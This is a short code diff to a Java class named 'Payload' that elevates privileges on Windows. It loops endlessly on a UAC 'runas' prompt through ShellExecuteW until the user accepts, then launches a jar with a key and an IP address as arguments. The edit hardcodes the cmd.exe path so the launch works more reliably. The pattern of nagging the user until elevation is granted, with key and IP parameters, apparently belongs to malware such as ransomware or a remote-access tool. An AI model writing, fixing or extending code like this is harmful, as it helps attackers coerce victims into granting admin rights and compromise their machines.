@@ -58,13 +58,14 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Use cmd.exe /c to launch it, which fixes the "Code 2" file-not-found issue
+            // Explicit absolute path to cmd.exe
+            String cmdExe = "C:\\Windows\\System32\\cmd.exe";
             String cmdArgs = String.format("/c \"\"%s\" -jar \"%s\" %s %s\"", javaExe, jarPath, key, ip);
 
             while (true) {
                 log("Triggering UAC...");
                 int result = Shell32.INSTANCE.ShellExecuteW(
-                    null, "runas", "cmd.exe", cmdArgs, null, 1
+                    null, "runas", cmdExe, cmdArgs, "C:\\Windows\\System32", 1
                 );
 
                 if (result > 32) {
